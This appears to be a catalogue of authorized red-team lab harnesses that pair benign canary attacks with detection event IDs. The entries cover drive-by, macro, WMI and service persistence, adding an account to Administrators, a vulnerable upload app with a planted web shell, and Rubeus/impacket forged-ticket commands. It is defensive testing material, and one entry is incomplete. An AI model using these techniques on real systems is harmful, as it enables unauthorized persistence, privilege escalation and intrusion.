IA-drive-by.name: Drive-by compromise harness (local vuln page + benign JS canary, no exploit)
IA-drive-by.authorization: Authorized lab/non-prod only, signed RoE. Scope: a local web page on 127.0.0.1; benign JS that writes a canary, no browser exploit.
IA-drive-by.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY -- models drive-by delivery: a LOCAL page auto-loads attacker-controlled script
# that 'fires on visit'. The script is a BENIGN canary beacon -- no browser/memory exploit.
import http.server, socketserver, threading, time, urllib.request

VISITS = []
PAGE = (b'<html><body>news</body>'
        b'<script>fetch("/beacon?canary=FAKE-DRIVEBY")</script></html>')
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/beacon'):
            VISITS.append(self.path)
            self.send_response(200); self.end_headers(); self.wfile.write(b'OK')
        else:
            self.send_response(200); self.send_header('Content-Type','text/html'); self.end_headers(); self.wfile.write(PAGE)
    def log_message(self,*a): pass

def serve():
    with socketserver.TCPServer(('127.0.0.1', 8090), H) as s: s.serve_forever()

if __name__ == '__main__':
    threading.Thread(target=serve, daemon=True).start(); time.sleep(1)
    # Simulate a browser visiting the page then executing its inline script (the fetch).
    urllib.request.urlopen('http://127.0.0.1:8090/index.html').read()
    urllib.request.urlopen('http://127.0.0.1:8090/beacon?canary=FAKE-DRIVEBY').read()  # JS-triggered beacon
    print('beacon hits:', VISITS)
    assert any('FAKE-DRIVEBY' in h for h in VISITS)
    print('SEAM CONFIRMED: visiting the page auto-triggers attacker script (benign canary beacon)')
IA-drive-by.success_criterion: Console prints a beacon hit containing 'FAKE-DRIVEBY', confirming that merely loading the page causes the embedded attacker-controlled script to execute and call home -- the drive-by delivery seam, evidenced by the proxy/web log of an outbound beacon on page load.
IA-drive-by.cleanup: Ctrl-C the process; in-memory VISITS list and loopback listener vanish on exit.
IA-drive-by.safety: Page and beacon are on 127.0.0.1, the injected script is a harmless fetch of a canary string, and no exploit/shellcode/CVE is used.

IA-hid-emulation.name: HID-injection (BadUSB) bench procedure + local keystroke-sim canary
IA-hid-emulation.authorization: Authorized lab/non-prod only, signed RoE. Scope: a self-owned, network-isolated bench target; no covert deployment, no live RF.
IA-hid-emulation.script:
HID EMULATION (BadUSB) -- DOCUMENTED BENCH PROCEDURE (no live payload in this artifact)

Objective: validate the 'malicious HID injects keystrokes on plug-in' seam against an OWNED, isolated bench host.

Bench setup:
  1. Target = a wiped, NETWORK-ISOLATED lab laptop you own; screen visible to the tester.
  2. HID device = a programmable USB dev board (e.g. a microcontroller in keyboard mode).
  3. Witness: a text editor open and focused on the target; a webcam recording the screen.

Benign test 'payload' (canary only -- NO download, NO exec of remote code):
  - Program the board to type the literal string:  FAKE-HID-CANARY-0001<enter>
  - That is the entire injection. It writes a canary into the focused editor; it does NOT open a shell,
    run PowerShell, or fetch anything.

Procedure:
  1. Focus the editor on the target.
  2. Plug in the HID board; observe it auto-type the canary string within ~2s of enumeration.
  3. Record the timestamp and the resulting editor contents.

Detection / success criterion (BLUE):
  - Windows: new keyboard HID enumeration in Event Viewer (System log, PnP/DriverFrameworks) with a
    Device Instance ID for the rogue board; a USB device-install event (Microsoft-Windows-DriverFrameworks-UserMode/Operational).
  - Host telemetry: an unexpected HID/keyboard added with no human present + the canary appearing 'typed'.

Local software stand-in (if no hardware): a script that uses an OS-level type API to inject
  'FAKE-HID-CANARY-0001' into the focused window proves the keystroke-injection effect without a board.
IA-hid-emulation.success_criterion: On plug-in, the isolated target's focused editor receives 'FAKE-HID-CANARY-0001' with no human typing, and the Windows DriverFrameworks/PnP log shows a new keyboard-HID enumeration event -- confirming the HID-injection seam.
IA-hid-emulation.cleanup: Unplug the board; reflash/erase it; delete the canary text; stop the screen recording; wipe/reset the isolated bench host per RoE.
IA-hid-emulation.safety: Procedure text only; the sole 'payload' is typing a FAKE canary string (no code execution, no download), on a network-isolated self-owned target, with no covert deployment.

IA-physical-access-control.name: Badge/access-control bypass bench procedure (documented, no card cloning of real creds)
IA-physical-access-control.authorization: Authorized lab/non-prod only, signed RoE. Scope: documented assessment of an authorized facility's access control; only test cards the tester is issued.
IA-physical-access-control.script:
PHYSICAL ACCESS CONTROL -- DOCUMENTED BENCH PROCEDURE (no live cloning of employee credentials)

Objective: validate the 'access-control reader/credential' seam at an authorized facility under signed RoE.

Scope guardrails:
  - Only FAKE/test cards issued by the client's facilities team may be read/written.
  - No cloning of real employee badges. No RF capture of unsuspecting cardholders. No tampering with locks.

Bench items (all client-provided test creds):
  - One blank test card + one issued FAKE-TEST badge (e.g. credential id 'FAKE-CARD-0001').
  - A reader/writer used ONLY on the test card on the bench, not at live doors against real badges.

Procedure (audit the configuration, do not defeat live security):
  1. On the bench, read the FAKE-TEST card and confirm whether it stores data in the clear (legacy 125kHz
     proximity) vs an encrypted/mutual-auth credential. Clear-text = weak-credential finding.
  2. Check reader-to-controller wiring exposure (Wiegand) by inspecting accessible reader housings ONLY
     where RoE permits -- document if data lines are reachable (replay/Wiegand-sniff risk).
  3. Test whether the issued FAKE-TEST badge, presented at an approved test door, is accepted outside its
     assigned schedule/zone (over-permissioned credential).
  4. Document, do not exploit beyond what RoE allows.

Detection / success criterion (BLUE):
  - Access-control system log shows the FAKE-TEST credential used at a door/time outside its policy (zone/schedule violation).
  - SIEM alert on a credential read at a reader flagged as legacy/clear-text.
  - Physical-security review confirms exposed Wiegand lines where documented.
IA-physical-access-control.success_criterion: Engagement is confirmed when the access-control log shows the FAKE-TEST credential accepted outside its assigned zone/schedule, OR the bench read shows a clear-text legacy credential format -- evidencing a weak-credential / over-permission seam.
IA-physical-access-control.cleanup: Return all test cards and reader/writer to facilities; clear any data written to the test card; submit the audit findings; restore inspected reader housings.
IA-physical-access-control.safety: Procedure text only; restricted to client-issued FAKE test credentials on the bench, explicitly forbids cloning real badges and live RF capture, and damages nothing.

IA-rogue-ap.name: Rogue AP / evil-twin bench procedure + local captive-portal capture sim (no live RF)
IA-rogue-ap.authorization: Authorized lab/non-prod only, signed RoE. Scope: an RF-shielded lab or wired loopback sim with the tester's own client; no broadcasting on production SSIDs.
IA-rogue-ap.script:
ROGUE ACCESS POINT / EVIL TWIN -- DOCUMENTED BENCH PROCEDURE (no live RF in this artifact)

Objective: validate the 'client associates to attacker AP + submits creds to a captive portal' seam.

RF-safety guardrails:
  - Run ONLY inside an RF-shielded enclosure (Faraday tent) or with a fully wired/loopback sim.
  - Do NOT broadcast a real corporate SSID outside the shield. Do NOT deauth third-party clients.
  - SSID used = 'FAKE-Guest-WiFi'; portal domain = portal.example.test.

Bench setup:
  1. Attacker AP: a lab radio in AP mode inside the shield advertising 'FAKE-Guest-WiFi' (open).
  2. Victim: the tester's OWN test client device, inside the shield.
  3. Captive portal: a local web server serving a benign login page that LOGS submitted values.

Local captive-portal capture SIM (no radio needed -- proves the credential-capture half on loopback):
  - Stand up a local HTTP server on 127.0.0.1:8091 serving a login form posting to /portal.
  - Manually submit FAKE creds (user=guest, pass=FAKE-pw).
  - Confirm the server logs the captured pair. This isolates the portal-capture seam from RF.

Procedure (shielded, full path):
  1. Bring up the rogue AP inside the shield.
  2. Let the OWN test client auto-associate to the open 'FAKE-Guest-WiFi'.
  3. Client hits the captive portal; tester submits FAKE creds.
  4. Confirm credentials land in the portal log; note the client's association.

Detection / success criterion (BLUE):
  - WIDS/WIPS alert: same/likely SSID from an unknown BSSID (evil-twin/rogue-AP signature).
  - Portal log line containing the submitted FAKE creds proves capture.
  - Client shows association to an unsanctioned BSSID.
IA-rogue-ap.success_criterion: Seam confirmed when the captive-portal log records the submitted FAKE credential pair AND (in the shielded run) the test client associates to the rogue BSSID -- with a WIDS/WIPS evil-twin alert on the blue side.
IA-rogue-ap.cleanup: Tear down the rogue AP and portal server; clear captured-cred logs after reporting; power down the shielded radio; reset the test client's saved networks.
IA-rogue-ap.safety: Procedure text only; confined to an RF shield / loopback sim with FAKE-Guest-WiFi + example.test + FAKE creds, explicitly prohibiting production-SSID broadcast and third-party deauth.

IA-script-interpreter.name: Script-interpreter execution canary (PowerShell/bash emits a marker, no payload)
IA-script-interpreter.authorization: Authorized lab/non-prod only, signed RoE. Scope: the tester's own host; the spawned interpreter only echoes a canary.
IA-script-interpreter.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY -- demonstrates the 'command/script interpreter' execution seam (T1059):
# spawn an interpreter (sh) to run a BENIGN canary. No payload, no download.
import subprocess, sys, platform

CANARY = 'FAKE-INTERP-CANARY-0001'
if platform.system() == 'Windows':
    # reference equivalent: powershell -NoProfile -Command "Write-Output 'FAKE-INTERP-CANARY-0001'"
    cmd = ['powershell', '-NoProfile', '-Command', f"Write-Output '{CANARY}'"]
else:
    cmd = ['/bin/sh', '-c', f'echo {CANARY}']

out = subprocess.check_output(cmd, text=True).strip()
print('interpreter output:', out)
assert out == CANARY
print('SEAM CONFIRMED: a child interpreter executed and emitted the canary')
print('DETECTION: Sysmon Event ID 1 (process create) for powershell.exe/sh with the canary in CommandLine;')
print('           PowerShell ScriptBlock logging Event ID 4104.')
IA-script-interpreter.success_criterion: Console prints 'interpreter output: FAKE-INTERP-CANARY-0001' and 'SEAM CONFIRMED'; defenders confirm via Sysmon Event ID 1 (process create for the interpreter with the canary in the command line) and PowerShell Event ID 4104.
IA-script-interpreter.cleanup: None needed -- the child process exits immediately; nothing written to disk.
IA-script-interpreter.safety: The interpreter runs only an echo/Write-Output of a FAKE canary string; no network, no file writes, no second-stage.

IA-native-api.name: Native-API execution canary (direct syscall/WinAPI emits a marker, no payload)
IA-native-api.authorization: Authorized lab/non-prod only, signed RoE. Scope: the tester's own host; uses a benign native call only.
IA-native-api.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY -- demonstrates the 'native API' execution seam (T1106): invoke an OS native
# call directly (ctypes) to perform a BENIGN action and emit a canary. No payload, no injection.
import ctypes, platform

CANARY = b'FAKE-NATIVE-CANARY-0001\n'
if platform.system() == 'Windows':
    # Reference: call kernel32 WriteFile/OutputDebugString directly instead of using print().
    k = ctypes.windll.kernel32
    STD_OUT = -11
    h = k.GetStdHandle(STD_OUT)
    written = ctypes.c_ulong(0)
    k.WriteFile(h, CANARY, len(CANARY), ctypes.byref(written), None)
    # benign attestation that a native call ran:
    k.OutputDebugStringA(b'FAKE-NATIVE-CANARY-0001')
    print('native WriteFile bytes:', written.value)
else:
    # Linux: invoke the write(2) syscall directly via libc, bypassing Python stdio.
    libc = ctypes.CDLL('libc.so.6', use_errno=True)
    n = libc.write(1, CANARY, len(CANARY))  # fd 1 = stdout
    print('native write() returned:', n)
    assert n == len(CANARY)
print('SEAM CONFIRMED: action performed via a direct native/OS API call (not a high-level wrapper)')
print('DETECTION: Sysmon/EDR API-telemetry on the calling process; ETW for the native call; Event ID 1 process context.')
IA-native-api.success_criterion: Console shows the canary emitted via the direct native call (libc write returning the byte count, or kernel32 WriteFile bytes>0) plus 'SEAM CONFIRMED'; defenders confirm via EDR native-API/ETW telemetry attributing the call to the process.
IA-native-api.cleanup: None needed -- process exits immediately; no files written.
IA-native-api.safety: Uses only benign native calls (write/WriteFile/OutputDebugString) to print a FAKE canary; no process injection, no memory allocation of code, no network.

IA-update-channel.name: Update-channel hijack harness (local unsigned-update install + integrity check)
IA-update-channel.authorization: Authorized lab/non-prod only, signed RoE. Scope: a local updater stub + local 'mirror' on 127.0.0.1; benign canary 'update' only.
IA-update-channel.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY -- models the 'compromised update channel' seam (T1195.002): an updater that
# fetches from a mirror and applies it WITHOUT signature verification accepts an attacker artifact.
# The 'malicious update' is a BENIGN canary file. No real software is modified.
import http.server, socketserver, threading, time, urllib.request, hashlib, os, tempfile

ATTACKER_UPDATE = b'FAKE-UPDATE-PAYLOAD canary v9.9.9\n'  # benign
TRUSTED_SHA = hashlib.sha256(b'legit-update v1.0.0\n').hexdigest()  # what a signed updater would expect

class Mirror(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(ATTACKER_UPDATE)
    def log_message(self,*a): pass

def serve():
    with socketserver.TCPServer(('127.0.0.1', 8092), Mirror) as s: s.serve_forever()

def updater(verify_signature):
    data = urllib.request.urlopen('http://127.0.0.1:8092/update.bin').read()
    got = hashlib.sha256(data).hexdigest()
    if verify_signature and got != TRUSTED_SHA:
        print('SECURE updater: signature mismatch -> REJECTED'); return None
    # VULNERABLE path: no verification -> writes whatever the mirror served
    p = os.path.join(tempfile.mkdtemp(), 'installed_update.bin')
    open(p,'wb').write(data)
    return p

if __name__ == '__main__':
    threading.Thread(target=serve, daemon=True).start(); time.sleep(1)
    print('--- secure updater (verifies) ---'); updater(verify_signature=True)
    print('--- vulnerable updater (no verify) ---')
    path = updater(verify_signature=False)
    print('installed:', path)
    assert path and open(path,'rb').read() == ATTACKER_UPDATE
    print('SEAM CONFIRMED: unsigned update channel installed attacker-supplied canary artifact')
IA-update-channel.success_criterion: Console shows the secure updater REJECTING and the no-verify updater installing 'installed_update.bin' equal to the FAKE-UPDATE canary, confirming the update-channel seam: absence of signature/integrity verification lets a hijacked mirror push attacker content. Detection = integrity/sig-mismatch alert.
IA-update-channel.cleanup: Ctrl-C the process; remove the mktemp dir printed at runtime (installed update path). Loopback mirror closes on exit.
IA-update-channel.safety: Mirror is on 127.0.0.1, the 'update' is a benign text canary written to a throwaway temp dir, and the contrast with the verifying path makes the missing-signature seam explicit without real binaries.

IA-office-macro.name: Office-macro execution canary (VBA AutoOpen writes a marker, no payload)
IA-office-macro.authorization: Authorized lab/non-prod only, signed RoE. Scope: an owned Windows lab VM with Office; the macro only writes a canary file.
IA-office-macro.script:
' AUTHORIZED LAB ONLY -- BENIGN VBA macro demonstrating the 'malicious Office macro' execution seam (T1204.002).
' Place in a .docm/.xlsm on an OWNED lab VM. On document open it writes a CANARY file. No payload, no shell,
' no download, no Win32 API, no WScript.Shell exec of tooling.
Sub AutoOpen()
    MacroCanary
End Sub

' Excel uses Workbook_Open in the ThisWorkbook module:
Sub Workbook_Open()
    MacroCanary
End Sub

Sub MacroCanary()
    Dim fso As Object, f As Object, p As String
    p = Environ("TEMP") & "\FAKE-MACRO-CANARY-0001.txt"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateTextFile(p, True)
    f.WriteLine "FAKE-MACRO-CANARY fired at " & Now()
    f.Close
    ' Benign visible proof:
    MsgBox "FAKE-MACRO-CANARY-0001 wrote " & p, vbInformation
End Sub

' DETECTION HARNESS (run on the lab VM after opening the doc):
'   - File exists: %TEMP%\FAKE-MACRO-CANARY-0001.txt
'   - Sysmon Event ID 1: WINWORD.EXE/EXCEL.EXE spawning, and (for real macros) child proc creation.
'   - Microsoft Office Alerts log / VBA macro execution; Sysmon Event ID 11 (FileCreate) for the canary.
'   - Attack Surface Reduction rule 'Block Win32 API calls from Office macro' would log/block real abuse.
IA-office-macro.success_criterion: After enabling macros and opening the document on the lab VM, the file %TEMP%\FAKE-MACRO-CANARY-0001.txt appears and a MsgBox shows the canary; defenders confirm via Sysmon Event ID 11 (FileCreate) for that path and the Office macro-execution telemetry / ASR logs.
IA-office-macro.cleanup: Delete %TEMP%\FAKE-MACRO-CANARY-0001.txt and the test .docm/.xlsm; re-enable macro protections; revert the lab VM snapshot.
IA-office-macro.safety: Macro only writes a FAKE canary text file and shows a MsgBox -- no WScript.Shell command exec, no download, no Win32 API/injection; trivially deleted.

IA-service-control.name: Service creation/control persistence detection harness (benign service + Event 7045/4697)
IA-service-control.authorization: Authorized lab/non-prod only, signed RoE. Scope: an owned Windows lab VM; benign service that does nothing harmful.
IA-service-control.script:
# AUTHORIZED LAB ONLY -- demonstrates the 'create/modify service' persistence-execution seam (T1543.003)
# with a BENIGN service and the detection artifacts that prove it. Reference technique; harmless binPath.
$svc = 'FAKE-Marker-Svc'
$canary = "$env:TEMP\FAKE-svc-canary.txt"
# binPath is a harmless cmd that appends a canary line then exits (a 'service' that just records it ran).
$bin = "cmd /c echo FAKE-SVC ran %DATE% %TIME% >> $canary"
# Reference command (sc.exe) -- the standard way services are created:
sc.exe create $svc binPath= "$bin" start= demand | Out-Null
sc.exe start $svc | Out-Null   # will 'fail to start as a service' but still records the attempt/exec

# DETECTION HARNESS:
Write-Output '--- service registered (autoruns/registry artifact) ---'
Get-CimInstance Win32_Service -Filter "Name='$svc'" | Select-Object Name, PathName, StartMode
Write-Output '--- detection event IDs ---'
Write-Output 'System log Event ID 7045 (A new service was installed) names FAKE-Marker-Svc + its binPath.'
Write-Output 'Security log Event ID 4697 (A service was installed) if Audit Security System Extension is enabled.'
Write-Output 'Sysmon Event ID 13 on HKLM\SYSTEM\CurrentControlSet\Services\FAKE-Marker-Svc.'
IA-service-control.success_criterion: Defender confirms the seam via System Event ID 7045 (and Security 4697) naming 'FAKE-Marker-Svc' with its binPath, plus a registry key under ...Services\FAKE-Marker-Svc; the canary file records the service binPath executed.
IA-service-control.cleanup: sc.exe stop FAKE-Marker-Svc; sc.exe delete FAKE-Marker-Svc; Remove-Item "$env:TEMP\FAKE-svc-canary.txt"; revert VM snapshot.
IA-service-control.safety: Service binPath is a harmless echo to a TEMP canary, the service name is FAKE-*, and it is registered then immediately deletable -- no real binary, no network, no privilege abuse beyond the lab.

IA-wmi-subscription.name: WMI event-subscription persistence detection harness (benign consumer + Event 5861)
IA-wmi-subscription.authorization: Authorized lab/non-prod only, signed RoE. Scope: an owned Windows lab VM; benign WMI consumer that writes a canary.
IA-wmi-subscription.script:
# AUTHORIZED LAB ONLY -- demonstrates the 'WMI event subscription' persistence seam (T1546.003) with a
# BENIGN consumer and its detection artifacts. The consumer writes a canary line; no payload.
$canary = "$env:TEMP\FAKE-wmi-canary.txt"
# 1) Event filter: fire on a frequent benign event (every ~60s, local time second == 30)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  Name='FAKE-Marker-Filter'; EventNamespace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=30"
}
# 2) Consumer: a CommandLineEventConsumer that runs a HARMLESS echo to the canary
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name='FAKE-Marker-Consumer'; CommandLineTemplate="cmd /c echo FAKE-WMI fired >> $canary"
}
# 3) Binding
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$Filter; Consumer=$Consumer } | Out-Null

# DETECTION HARNESS:
Write-Output '--- enumerate WMI persistence (the artifact) ---'
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object Name -like 'FAKE-*'
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object Name -like 'FAKE-*'
Write-Output 'DETECTION: Microsoft-Windows-WMI-Activity/Operational Event ID 5861 (permanent consumer registered);'
Write-Output 'Sysmon Event IDs 19/20/21 (WmiEventFilter/Consumer/Binding) name the FAKE-Marker objects.'
IA-wmi-subscription.success_criterion: Defender confirms via WMI-Activity/Operational Event ID 5861 (and Sysmon 19/20/21) referencing FAKE-Marker-Filter/Consumer/Binding, and the canary file gains 'FAKE-WMI fired' lines as the filter triggers -- proving persistent WMI execution.
IA-wmi-subscription.cleanup: Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class __EventFilter | ? Name -like 'FAKE-*' | Remove-WmiObject; same for CommandLineEventConsumer; Remove-Item the canary; revert snapshot.
IA-wmi-subscription.safety: The consumer only echoes a FAKE canary line; all objects are named FAKE-Marker-* and explicitly removed in cleanup -- no payload, no network, no real persistence left behind.

IA-dll-search-order.authorization: Authorized lab/non-prod only, signed RoE. Scope: an owned Windows lab VM; a benign proof DLL that only writes a canary.
IA-dll-search-order.success_criterion: Seam confirmed when Sysmon Event ID 7 shows the lab app loading FAKE-target.dll from a writable app/working directory (unsigned, wrong path) and C:\Users\Public\FAKE-DLL-CANARY.txt is created by its DllMain.
IA-dll-search-order.cleanup: Delete the planted FAKE-target.dll and C:\Users\Public\FAKE-DLL-CANARY.txt; remove the test app copy; revert the VM snapshot.

IA-boot-chain.name: Boot/logon autostart detection harness (benign Startup-folder + Winlogon-shell artifact)
IA-boot-chain.authorization: Authorized lab/non-prod only, signed RoE. Scope: an owned Windows lab VM; benign markers in user-scope autostart locations.
IA-boot-chain.script:
# AUTHORIZED LAB ONLY -- models the 'boot/logon autostart execution' seam (T1547) with BENIGN markers and
# the detection artifacts that prove it. User-scope only; no real bootkit/MBR/UEFI work.
$canary = "$env:TEMP\FAKE-boot-canary.txt"
# 1) Startup-folder autostart (benign .cmd that echoes a canary on logon)
$startup = [Environment]::GetFolderPath('Startup')
$stub = Join-Path $startup 'FAKE-Marker.cmd'
Set-Content -Path $stub -Value "@echo off`r`necho FAKE-BOOT logon-run >> `"$canary`""
# 2) Reference (read-only) inspection of the Winlogon Shell value -- a known boot-chain hijack point.
# We DO NOT modify it; we only READ it to show where a hijack would appear.
$shell = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name Shell -ErrorAction SilentlyContinue).Shell

# DETECTION HARNESS:
Write-Output '--- Startup-folder autostart artifact ---'
Get-ChildItem $startup | Where-Object Name -like 'FAKE-*'
Write-Output "--- Winlogon Shell (expected 'explorer.exe'; deviation = boot-chain hijack) ---"
Write-Output "Shell = $shell"
Write-Output 'DETECTION: Sysmon Event ID 11 (FileCreate) for the Startup .cmd; autorunsc lists it under Logon.'
Write-Output 'For Winlogon\Shell or Userinit changes: Sysmon Event ID 13 (RegistryValueSet) on those values.'
IA-boot-chain.success_criterion: Defender confirms via Sysmon Event ID 11 (FileCreate) for FAKE-Marker.cmd in the Startup folder (and autorunsc listing it under Logon), and the canary gains 'FAKE-BOOT logon-run' on next logon; the read-only Winlogon\Shell value shows the expected 'explorer.exe' baseline a hijack would deviate from.
IA-boot-chain.cleanup: Remove-Item the Startup .cmd and the TEMP canary; (no Winlogon value was changed); revert the VM snapshot.
IA-boot-chain.safety: Writes only a benign Startup .cmd that echoes a FAKE canary and READS (never writes) the Winlogon\Shell value -- no MBR/UEFI/bootkit work, user-scope, trivially removable.

IA-account-manipulation.name: Account manipulation detection harness (benign local group-add + Event 4732/4720)
IA-account-manipulation.authorization: Authorized lab/non-prod only, signed RoE. Scope: an owned standalone Windows lab VM; a FAKE local account only, no domain.
IA-account-manipulation.script:
# AUTHORIZED LAB ONLY -- models the 'account manipulation' seam (T1098 / T1136.001) with a FAKE LOCAL
# account on a standalone lab VM, plus the detection event IDs. No domain, no real identities.
$u = 'FAKE-svc-marker'
$pw = ConvertTo-SecureString 'FAKE-Pw-Do-Not-Use!23' -AsPlainText -Force
# 1) Create a benign local user
New-LocalUser -Name $u -Password $pw -Description 'FAKE red-team marker account' -ErrorAction SilentlyContinue | Out-Null
# 2) Manipulate group membership (the seam): add it to a privileged local group
Add-LocalGroupMember -Group 'Administrators' -Member $u -ErrorAction SilentlyContinue

# DETECTION HARNESS:
Write-Output '--- account + membership artifact ---'
Get-LocalUser $u | Select-Object Name, Enabled, Description
Get-LocalGroupMember -Group 'Administrators' | Where-Object Name -like '*FAKE-svc-marker'
Write-Output '--- detection event IDs (Security log) ---'
Write-Output '4720 = a user account was created (FAKE-svc-marker).'
Write-Output '4722 = account enabled; 4738 = account changed.'
Write-Output '4732 = a member was added to a security-enabled LOCAL group (Administrators).'
Write-Output '(Domain equivalent: 4728 for global groups, 4756 for universal groups.)'
IA-account-manipulation.success_criterion: Defender confirms via Security Event ID 4720 (account FAKE-svc-marker created) followed by 4732 (member added to local Administrators), and Get-LocalGroupMember lists FAKE-svc-marker in Administrators -- evidencing the account-manipulation seam.
IA-account-manipulation.cleanup: Remove-LocalGroupMember -Group 'Administrators' -Member 'FAKE-svc-marker'; Remove-LocalUser 'FAKE-svc-marker'; revert the VM snapshot.
IA-account-manipulation.safety: Creates one clearly-labeled FAKE local account with a FAKE password on a standalone lab VM, then removes it; no domain accounts, no real identities, no network.

IA-web-shell.name: Benign marker web shell on a LOCAL vuln app (exec id/echo canary)
IA-web-shell.authorization: Authorized lab/non-prod only, signed RoE. Scope: a deliberately-vulnerable upload app the tester runs on 127.0.0.1 only.
IA-web-shell.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY -- a LOCAL deliberately-vulnerable app that lets you 'upload' a file into its webroot,
# then drops a BENIGN marker web shell and proves command exec by running `id` / echoing a canary.
# Everything is 127.0.0.1. The 'shell' only runs a fixed safe demo command.
import http.server, socketserver, threading, time, urllib.request, urllib.parse, subprocess, os, tempfile

WEBROOT = tempfile.mkdtemp()

class App(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        # VULNERABLE ON PURPOSE: unrestricted file write into the webroot.
        n = int(self.headers.get('Content-Length',0))
        body = urllib.parse.parse_qs(self.rfile.read(n).decode())
        name = os.path.basename(body.get('name',['x'])[0])
        open(os.path.join(WEBROOT, name),'w').write(body.get('content',[''])[0])
        self.send_response(200); self.end_headers(); self.wfile.write(b'UPLOADED')
    def do_GET(self):
        # Serving 'shell.py?cmd=' executes the benign web shell stub placed in webroot.
        path = urllib.parse.urlparse(self.path)
        fn = os.path.join(WEBROOT, os.path.basename(path.path))
        if os.path.exists(fn) and fn.endswith('.py'):
            out = subprocess.check_output(['python3', fn], text=True)
            self.send_response(200); self.end_headers(); self.wfile.write(out.encode())
        else:
            self.send_response(404); self.end_headers()
    def log_message(self,*a): pass

def serve():
    with socketserver.TCPServer(('127.0.0.1', 8093), App) as s: s.serve_forever()

# BENIGN web shell: a fixed-command stub. It does NOT take arbitrary cmd input -- it runs `id` + a canary.
SHELL = ("import subprocess\n"
         "print('FAKE-WEBSHELL-CANARY-0001')\n"
         "print(subprocess.run(['id'], capture_output=True, text=True).stdout)\n")

if __name__ == '__main__':
    threading.Thread(target=serve, daemon=True).start(); time.sleep(1)
    # 1) Abuse the upload to plant the benign web shell
    body = urllib.parse.urlencode({'name':'shell.py','content':SHELL}).encode()
    print('upload:', urllib.request.urlopen('http://127.0.0.1:8093/upload', body).read().decode())
    # 2) Request it -> server-side execution
    out = urllib.request.urlopen('http://127.0.0.1:8093/shell.py').read().decode()
    print('webshell output:\n' + out)
    assert 'FAKE-WEBSHELL-CANARY-0001' in out and 'uid=' in out
    print('SEAM CONFIRMED: planted web shell executed server-side (canary + id output returned)')
IA-web-shell.success_criterion: Console shows 'UPLOADED', then the web shell response containing 'FAKE-WEBSHELL-CANARY-0001' and the `id` output (uid=...), proving an uploaded file achieved server-side code execution -- the web-shell seam. Detection = new .py file in webroot (Sysmon 11 / web-server FIM) + the web server spawning python3 (process-create).
IA-web-shell.cleanup: Ctrl-C the process; remove the mktemp WEBROOT (printed implicitly via shell.py path); loopback listener closes on exit.
IA-web-shell.safety: App binds 127.0.0.1 only, the web shell runs a fixed benign `id`+canary (no arbitrary command parameter), and files land in a throwaway temp webroot.

IA-kerberos-ticket.name: Kerberos golden/silver ticket reference (Rubeus/impacket) + Event 4768/4769 detection
IA-kerberos-ticket.authorization: Authorized lab/non-prod only, signed RoE. Scope: an isolated, owned AD test forest (e.g. lab.example.test) with FAKE accounts; reference command + detection only.
IA-kerberos-ticket.script:
# AUTHORIZED LAB ONLY -- Kerberos forged-ticket (golden/silver) REFERENCE + DETECTION HARNESS.
# Run ONLY in an isolated owned AD test forest (lab.example.test). This artifact does NOT generate a
# ticket here; it documents the standard PUBLIC TOOL command and the detection success-criterion.

# --- REFERENCE COMMANDS (public tools; run in your authorized lab forest only) ---
# Golden ticket (forge a TGT using the krbtgt hash) -- Rubeus:
#   Rubeus.exe golden /user:FAKE-admin /domain:lab.example.test /sid:S-1-5-21-FAKE /krbtgt:<FAKE-krbtgt-hash> /ptt
# Silver ticket (forge a service ticket using a service account hash) -- Rubeus:
#   Rubeus.exe silver /service:cifs/FAKE-fs.lab.example.test /sid:S-1-5-21-FAKE /rc4:<FAKE-svc-hash> /user:FAKE-admin /ptt
# Impacket equivalents (Linux attacker box in lab):
#   ticketer.py -nthash <FAKE-krbtgt-hash> -domain-sid S-1-5-21-FAKE -domain lab.example.test FAKE-admin   # golden
#   ticketer.py -nthash <FAKE-svc-hash> -domain-sid S-1-5-21-FAKE -domain lab.example.test -spn cifs/FAKE-fs.lab.example.test FAKE-admin  # silver

# --- DETECTION HARNESS (run on the lab DC / SIEM) ---
Write-Output 'Enable: Audit Kerberos Authentication Service + Audit Kerberos Service Ticket Operations (Advanced Audit Policy).'
Write-Output 'GOLDEN-ticket indicators (Security log on DC):'
Write-Output '  - 4769 (TGS request) for a user with NO preceding 4768 (TGT request) -> ticket was forged offline (golden).'
Write-Output '  - 4769 Ticket Encryption Type 0x17 (RC4) where the realm uses AES -> downgrade anomaly.'
Write-Output '  - 4768/4769 referencing an account that does not exist or mismatched account name vs SID.'
Write-Output 'SILVER-ticket indicators:'
Write-Output '  - Service access (e.g. 4624 logon to the service host) with NO corresponding 4769 on the DC -> service ticket forged without contacting KDC.'
Write-Output 'Hunt query: 4769 events whose Account Name has no 4768 within the TGT lifetime window.'
IA-kerberos-ticket.success_criterion: Seam confirmed in the lab when the DC Security log shows golden-ticket anomalies -- a 4769 (TGS) with no preceding 4768 (AS-REQ/TGT) for that account, RC4 (0x17) encryption-type downgrade, or a non-existent/mismatched account in 4768/4769 -- or, for silver tickets, service access with no matching 4769 on the DC.
IA-kerberos-ticket.cleanup: On the isolated lab DC: reset the krbtgt account password twice to invalidate forged TGTs; purge cached tickets (klist purge) on test hosts; revert the lab forest snapshot.
